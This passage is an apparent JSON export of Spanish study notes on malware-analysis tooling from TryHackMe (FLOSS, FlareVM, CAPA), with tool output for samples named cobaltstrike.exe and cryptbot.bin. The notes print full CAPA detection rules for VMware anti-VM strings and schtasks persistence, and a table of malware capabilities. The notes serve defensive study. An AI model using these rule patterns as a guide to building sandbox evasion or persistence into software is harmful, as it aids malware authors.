100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 74/74 [00:00<00:00, 2370.15 functions/s, skipped 0 library functions]\nINFO: floss.stackstrings: extracting stackstrings from 50 functions\nextracting stackstrings: 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 50/50 [00:00<00:00, 128.00 functions/s]\nINFO: floss.tightstrings: extracting tightstrings from 4 functions...\nextracting tightstrings from function 0x402e80: 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 4/4 [00:00<00:00, 31.99 functions/s]\nINFO: floss.string_decoder: decoding strings\nemulating function 0x402e80 (call 1/1): 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 21/21 [00:09<00:00,  2.21 functions/s]\nINFO: floss: finished execution after 265.61 seconds\nINFO: floss: rendering results \n\n\nFLARE FLOSS RESULTS (version v3.1.0-0-gdb9af41)\n\n+------------------------+------------------------------------------------------+\n| file path              | cobaltstrike.exe                                     |\n| identified language    | unknown                                              |\n| extracted strings      |                                                      |\n|  static strings        | 189 (2050 characters)                                |\n|   language strings     |   0 (   0 characters)                                |\n|  stack strings         | 0                                                    |\n|  tight strings         | 0                                                    |\n|  decoded strings       | 0                                                    |\n+------------------------+------------------------------------------------------+\n\n\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n  FLOSS STATIC STRINGS (189)\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n\n+-----------------------------------+\n| FLOSS STATIC STRINGS: ASCII (188) |\n+-----------------------------------+\n\n!This program cannot be run in DOS mode.\n.text\nP`.data\n.rdata\nP@.pdata\n0@.xdata\n0@.bss\n.idata\n.CRT\n.tls\nffffff.\nATUWVSH\n\n[...]\n\nstrncmp\nvfprintf\nKERNEL32.dll\nmsvcrt.dll\n\n\n+------------------------------------+\n| FLOSS STATIC STRINGS: UTF-16LE (1) |\n+------------------------------------+\n\nmsvcrt.dll\n\n\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n  FLOSS STACK STRINGS (0)\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n\n\n\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n  FLOSS TIGHT STRINGS (0)\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n\n\n\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n  FLOSS DECODED STRINGS (0)\n ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n```\n\nEn este ejemplo, FLOSS extrajo 189 strings est√°ticas del binario que pueden contener informaci√≥n hardcodeada como rutas, URLs, direcciones IP, llamadas a APIs, mensajes de error, registros, claves de encriptaci√≥n y configuraci√≥n de informaci√≥n. Sin embargo no fueron identificadas ninguna string descodificada.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "FlareVM o \"Forensics, Logic Analysis, and Reverse Engineering\", destaca como una colecci√≥n curada de herramientas especializadas √∫nicamente para responder a los requisitos de los ingenieros, analistas de malware, incident responders, investigadores forenses y pentesters. Este kit de herramientas dise√±ado de manera experta por el equipo FLARE de FireEye, es una poderosa ayuda al investigar o destapar misterios digitales y ganar visi√≥n dentro del comportamiento del malware.\n\n---------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explorar herramientas dentro de FlareVM.\n- Aprender c√≥mo usar herramientas para analizar procesos potencialmente maliciosos.\n- Familiarizarse con las herramientas usadas por el an√°lisis est√°tico de documentos y binarios maliciosos.\n\n-------------------------\n<h2>Pre-requisitos</h2>\nSe espera que est√©s familiarizado con Windows y procesos. Si no lo est√°s considera estudiar primero [[1. Pre Security]].",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. FlareVM - Arsenal of Tools",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/0-flarevm-arsenal-of-tools/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/0. FlareVM - Arsenal of Tools.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/1. Introduction]]\n[[2. Arsenal of Tools]]\n[[3. Commonly Used Tools for Investigation - Overview]]\n[[4. Analyzing Malicious Files!]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. CAPA - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/0-capa-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/0. CAPA - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/1. Introduction]]\n[[2. Tool Overview - How CAPA Works]]\n[[3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC]]\n[[4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue]]\n[[5. Dissecting CAPA Results Part 3 - Namespaces]]\n[[6. Dissecting CAPA Results Part 4 - Capability]]\n[[7. More Information, more fun!]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Uno de los retos al analizar software potencialmente malicioso es que nos arriesgamos a que nuestra propia m√°quina o entorno sea comprometido cuando lo ejecutamos. Generalmente existen dos tipos de an√°lisis: din√°mico y est√°tico. Esta habitaci√≥n se centra en realizar an√°lisis est√°tico usando una herramienta llamada CAPA.\n\nCAPA (Common Analysis Platform for Artifacts) es una herramienta desarrollada por el equipo FireEye Mandiant. Est√° dise√±ada para identificar las capabilidades presentes en un ejecutable como PE, ELF, .NET, shellcode incluso reportes sandbox. Hace eso analizando el archivo y aplicando un set de reglas que describen comportamientos comunes, permiti√©ndole determinar que es capaz de hacer el programa, como comunicarse por red, manipular archivos, inyectar procesos, y m√°s.\n\nLa belleza de CAPA es que encapsula a√±os de conocimiento sobre ingenier√≠a inversa en una herramienta automatizada, haci√©ndola accesible incluso a aquellos que no son expertos en ingenier√≠a inversa.\n\nEsta herramienta es particularmente √∫til en an√°lisis de malware y caza de amenazas.\n\n-----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Explorar qu√© es CAPA\n- Aprender a usar CAPA de forma eficiente\n- Entender campos comunes y resultados arrojados por la herramienta\n- Usar la herramienta para identificar la potencial actividad de un programa",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. More Information, more fun!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/7-more-information-more-fun/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/7. More Information, more fun!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea trataremos de determinar la raz√≥n del disparo de las reglas y condiciones involucradas. Usaremos el par√°metro `-vv` (very verbose) para conseguir esto.\n\n| Opci√≥n                | Descripci√≥n          | Sintaxis de Ejemplo           |\n| --------------------- | -------------------- | ----------------------------- |\n| `-v` or `--verbose`   | Habilita verbose     | `capa.exe -v .\\cryptbot.bin`  |\n| `-vv` or `--vverbose` | Habilita muy verbose | `capa.exe -vv .\\cryptbot.bin` |\n\n¬°Ejecut√©moslo!\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa -vv .\\cryptbot.bin\nloading : 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nEsto nos dar√° resultados m√°s detallados, sin embargo, llevar√° mucho tiempo. Como ya est√° hecho, miraremos el ejemplo:\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> Get-Content .\\cryptbot_vv.txt\n```\n\nAcceder a esta informaci√≥n desde consola o un editor de texto puede ser abrumador debido a la cantidad de texto en su interior.\n\nPara analizar su contenido con facilidad, necesitamos hacer dos cosas. La primera es usar los par√°metros `-j` y `-vv` y redirigir el resultado a un archivo `.json`. El comando quedar√≠a as√≠: `capa.bin -j -vv .\\cryptbot.bin > cryptbot_vv.json`.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa.bin -j -vv .\\cryptbot.bin > cryptbot_vv.json\nloading : 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nCon esto podemos empezar el siguiente paso.\n\n--------------------------\n<h2>Explorador Web CAPA</h2>\nLo segundo que tenemos que hacer es subir el archivo al **CAPA Web Explorer**. Podemos o usar la versi√≥n online en este [enlace](https://mandiant.github.io/capa/explorer/#/) o usar la versi√≥n offline en nuestra m√°quina virtual.\n\nAhora deber√≠amos ver la p√°gina de **Home**.\n\n![[Pasted image 20251028151115.png]]\n\nBuscaremos el bot√≥n \"**Upload from local**\" en la esquina inferior izquierda y selecciona el archivo `.json` que hemos preparado. Una vez subido deber√≠as ver un output similar a este:\n\n![[Pasted image 20251028151321.png]]\n\nAhora es momento de explorar esta adici√≥n a la herramienta. Revisaremos algunas capabilities y comprobaremos qu√© parte de las reglas exactamente fue un match.\n\nVeamos el primer ejemplo debajo. Sabemos que la capability fue **reference anti-VM strings targeting VMWare** y que el archivo de configuraci√≥n de regla correspondiente fue **anti-vm-strings-targeting-vmware.yml**.\n\n![[Pasted image 20251028151705.png]]\n\nVeamos el contenido de la regla:\n\n```PowerShell\nrule:\n  meta:\n    name: reference anti-VM strings targeting VMWare\n    namespace: anti-analysis/anti-vm/vm-detection\n    authors:\n      - michael.hunhoff@mandiant.com\n      - \"@johnk3r\"\n    scopes:\n      static: file\n      dynamic: file\n    att&ck:\n      - Defense Evasion::Virtualization/Sandbox Evasion::System Checks [T1497.001]\n    mbc:\n      - Anti-Behavioral Analysis::Virtual Machine Detection [B0009]\n    references:\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/VMWare.cpp\n    examples:\n      - al-khaser_x86.exe_\n      - b83480162ede09d4aa6d4850f9faa0a4c3834152752fd04cfdb22d647aa1f825:0x17D80\n  features:\n    - or:\n      - string: /VMWare/i\n      - string: /VMTools/i\n      - string: /SOFTWARE\\\\VMware, Inc\\.\\\\VMware Tools/i\n      - string: /VMWare/i\n      - string: /VMTools/i\n      - string: /SOFTWARE\\\\VMware, Inc\\.\\\\VMware Tools/i\n      - string: /vmnet\\.sys/i\n      - string: /vmmouse\\.sys/i\n      - string: /vmusb\\.sys/i\n      - string: /vm3dmp\\.sys/i\n      - string: /vmci\\.sys/i\n      - string: /vmhgfs\\.sys/i\n      - string: /vmmemctl\\.sys/i\n      - string: /vmx86\\.sys/i\n      - string: /vmrawdsk\\.sys/i\n      - string: /vmusbmouse\\.sys/i\n      - string: /vmkdb\\.sys/i\n      - string: /vmnetuserif\\.sys/i\n      - string: /vmnetadapter\\.sys/i\n      - string: /\\\\\\\\.\\\\HGFS/i\n      - string: /\\\\\\\\.\\\\vmci/i\n      - string: /vmtoolsd\\.exe/i\n      - string: /vmwaretray\\.exe/i\n      - string: /vmwareuser\\.exe/i\n      - string: /VGAuthService\\.exe/i\n      - string: /vmacthlp\\.exe/i\n      - string: /vmci/i\n        description: VMWare VMCI Bus Driver\n      - string: /vmhgfs/i\n        description: VMWare Host Guest Control Redirector\n      - string: /vmmouse/i\n      - string: /vmmemctl/i\n        description: VMWare Guest Memory Controller Driver\n      - string: /vmusb/i\n      - string: /vmusbmouse/i\n      - string: /vmx_svga/i\n      - string: /vmxnet/i\n      - string: /vmx86/i\n      - string: /VMwareVMware/i\n      - string: /vmGuestLib\\.dll/i\n      - string: /vmGuestLib\\.dll/i\n      - string: /Applications\\\\VMwareHostOpen\\.exe/i\n      - string: /vm3dgl\\.dll/i\n      - string: /vmdum\\.dll/i\n      - string: /vm3dver\\.dll/i\n      - string: /vmtray\\.dll/i\n      - string: /VMToolsHook\\.dll/i\n      - string: /vmmousever\\.dll/i\n      - string: /VmGuestLibJava\\.dll/i\n      - string: /vmscsi\\.sys/i\n```\n\n¬øLo viste? Bajo la funcionalidad \"**string: /VMWare/i**\" fue referenciado por CAPA Web Explorer. Simplemente CAPA diciendo que bajo ese namespace, pudimos identificar strings con el valor **VMWare** usando las condiciones en la regla y con regex.\n\nVeamos otro ejemplo. Sabemos que la capability fue **scheduled tasks via schtasts**, y que el archivo de regla fue **scheduled-tasks-via-schtasks.yml**.\n\n![[Pasted image 20251028152213.png]]\n\nLo mismo aplica que a nuestro primer ejemplo, nos centraremos en las features ya que es lo que CAPA usa para detectar coincidencias:\n\n```powershell\nrule:\n  meta:\n    name: schedule task via schtasks\n    namespace: persistence/scheduled-tasks\n    authors:\n      - 0x534a@mailbox.org\n    scopes:\n      static: function\n      dynamic: thread\n    att&ck:\n      - Persistence::Scheduled Task/Job::Scheduled Task [T1053.005]\n    examples:\n      - 79cde1aa711e321b4939805d27e160be:0x401440\n  features:\n    - and:\n      - match: host-interaction/process/create\n      - or:\n        - and:\n          - string: /schtasks/i\n          - string: /\\/create /i\n        - string: /Register-ScheduledTask /i\n```\n\nBajo las funcionalidades \"**string: /schtasks/i**\" y \"**string: /\\/create/i**\" fueron referenciadas en CAPA Web Explorer. Simplemente CAPA diciendo que bajo este namespace, y usando las condiciones en la regla y regex, pudo identificar strings con un valor de **schtasks** y **create**.\n\n---------------------------\n<h2>Caja de B√∫squeda Global</h2>\nOtra funcionalidad guay de esta herramienta es poder filtrar y la b√∫squeda global.\n\n![[Pasted image 20251028152712.png]]\n\nEs mucho m√°s r√°pido el an√°lisis de esta informaci√≥n usando CAPA Web Explorer que cualquier editor de texto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Dissecting CAPA Results Part 4 - Capability",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/6-dissecting-capa-results-part-4-capability/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/6. Dissecting CAPA Results Part 4 - Capability.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea continuaremos con el tema de la tarea pasada.\n\n----------------------------\n<h2>Capabilities</h2>\nDebajo hay una tabla con las capacidades (capabilities) y sus TLN, namespaces y reglas relacionados:\n\n| Capability                                     | Top-Level Namespace (TLN)                                                                         | Namespaces            | Archivo Rule YAML                                                         | Notas                                                                                                                                                      |\n| ---------------------------------------------- | ------------------------------------------------------------------------------------------------- | --------------------- | ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| reference anti-VM strings                      | [**Anti-Analysis**](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis)         | anti-vm/vm-detection  | reference-anti-vm-strings.yml                                             | Para comprobar las reglas bajo este namespace haz click [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis/anti-vm/vm-detection)  |\n| reference anti-VM strings targeting VMWare     | **Anti-Analysis**                                                                                 | anti-vm/vm-detection  | reference-anti-vm-strings-targeting-vmware.yml                            | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis/anti-forensic)        |\n| reference anti-VM strings targeting VirtualBox | **Anti-Analysis**                                                                                 | anti-vm/vm-detection  | reference-anti-vm-strings-targeting-virtualbox.yml                        | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n| reference HTTP User-Agent string               | [**Communication**](https://github.com/MBCProject/capa-rules-1/tree/master/communication)         | http/client           | reference-http-user-agent-string.yml                                      | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/communication/http/client))         |\n| check HTTP status code                         | **Communication**                                                                                 | http                  | check-http-status-code.yml                                                | Para comprobar las reglas bajo este namespace haz click [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/communication/http)                  |\n| reference Base64 string                        | [**Data Manipulation**](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation) | encoding/base64       | reference-base64-string.yml                                               | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation/encoding/base64)  |\n| encode data using XOR                          | **Data Manipulation**                                                                             | encoding/XOR          | encode-data-using-xor.yml                                                 | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation/encoding/xor)     |\n| contain a thread local storage (.tls) section  | [**Executable**](https://github.com/MBCProject/capa-rules-1/tree/master/executable)               | pe/section/tls        | contain-a-thread-local-storage-tls-section.yml                            | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n| get common file path                           | [**Host-Interaction**](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction)   | file-system           | get-common-file-path.yml                                                  | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n| create directory                               | **Host-Interaction**                                                                              | file-system/create    | create-directory.yml                                                      | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n| delete file                                    | **Host-Interaction**                                                                              | file-system/delete    | delete-file.yml                                                           | Para comprobar las reglas bajo este namespace haz click [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/delete) |\n| read file on Windows                           | **Host-Interaction**                                                                              | file-system/read      | read-file-on-windows.yml                                                  | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/read)  |\n| write file on Windows                          | **Host-Interaction**                                                                              | file-system/write     | write-file-on-windows.yml                                                 | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/write) |\n| get thread local storage value                 | **Host-Interaction**                                                                              | process               | get-thread-local-storage-value.yml                                        | Esta regla se encuentra bajo **TLN [Nursery](https://github.com/mandiant/capa-rules/tree/master/nursery)**                                                 |\n| allocate or change RWX memory                  | **Host-Interaction**                                                                              | process/inject        | allocate-or-change-rwx-memory.yml                                         | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/process/inject)    |\n| create process on Windows                      | **Host-Interaction**                                                                              | process create        | create-process-on-windows.yml                                             | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/process/create)    |\n| reference cryptocurrency strings               | [**Impact**](https://github.com/MBCProject/capa-rules-1/tree/master/impact)                       | impact/cryptocurrency | reference-cryptocurrency-strings.yml                                      | This rule is found under **TLN [Nursery](https://github.com/mandiant/capa-rules/tree/master/nursery),**¬†a staging ground for unpolished rules.             |\n| link function at runtime on Windows            | [**Linking**](https://github.com/MBCProject/capa-rules-1/tree/master/linking)                     | runtime-linking       | link-function-at-runtime-on-windows.yml                                   | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/linking/runtime-linking)            |\n| parse PE header                                | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code)                 | load-code/pe          | parse-pe-header.yml  <br>  <br>resolve-function-by-parsing-pe-exports.yml | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/pe)                       |\n| resolve function by parsing PE exports         | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code)                 | load-code/pe          | resolve-function-by-parsing-pe-exports.yml                                | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/pe)                       |\n| run PowerShell expression                      | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/powershell)      | load-code/PowerShell  | run-powershell-expression.yml                                             | Para comprobar las reglas bajo este namespace haz click  [aqu√≠](https://github.com/MBCProject/capa-rules-1/tree/master/linking/runtime-linking)            |\n| schedule task via at                           | [**persistence**](https://github.com/MBCProject/capa-rules-1/tree/master/persistence)             | scheduled-tasks       | schedule-task-via-at.yml                                                  | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n| schedule task via schtasks                     | [**persistence**](https://github.com/MBCProject/capa-rules-1/tree/master/persistence)             | scheduled-tasks       | schedule-task-via-schtasks.yml                                            | Puedes querer comprobar el TLN para m√°s reglas                                                                                                             |\n\nPara explicar esto m√°s en profundidad, veamos la primera capability en la tabla, \"**Reference anti-VM strings**\".\n\n- Nos damos cuenta de que las reglas relacionadas en formato YML son **reference-anti-vm-strings.yml**.\n- Esto est√° bajo en Namespace **anti-vm/vm-detection**.\n- Este a su vez est√° bajo el TLN **Anti-Analysis**.\n\nEsto nos dice que CAPA fue capaz de identificar que el software potencialmente malicioso busca claves de registro VM espec√≠ficas y la presencia de herramientas VMWare y otros elementos relacionados con las VMs usando el archivo **reference-anti-vm-strings.yml**.\n\nVeamos otro ejemplo. Miremos a \"schedule tasks via schtasks\":\n\n- Nos damos cuenta de que las reglas relacionadas en YML  son **schedule-task-via-schtasks.yml**.\n- Esto est√° bajo el Namespace **scheduled-tasks**.\n- Ese a su vez est√° bajo el TLN **persistence**.\n\nEsto nos dice que CAPA pudo identificar comportamientos relacionados a la programaci√≥n de tareas en un sistema operativo Windows usando **schedule-task-via-schtasks.yml**.\n\n¬øTe has fijado en algo?\n\nEl √≠tem bajo Capability tiene el mismo nombre que el archivo YML bajo Rules, con la √∫nica adici√≥n de un gui√≥n entre los espacios. Esto es porque Capability es el nombre de la regla.\n\nAlgunas excepciones donde la Capability no  est√° localizada bajo su Namespace:\n\n- **reference cryptocurrency strings**: Deber√≠a estar bajo **impact**, sin embargo est√° en **nursery**.\n\nAhora que tenemos un buen entendimiento y vista sobre los contenidos de Capability y Namespace, deber√≠amos ser capaces de explicar los resultados del ejemplo de la tarea pasada.\n\nHagamos un r√°pido repaso:\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ Capability                                ‚îÇ Namespace                         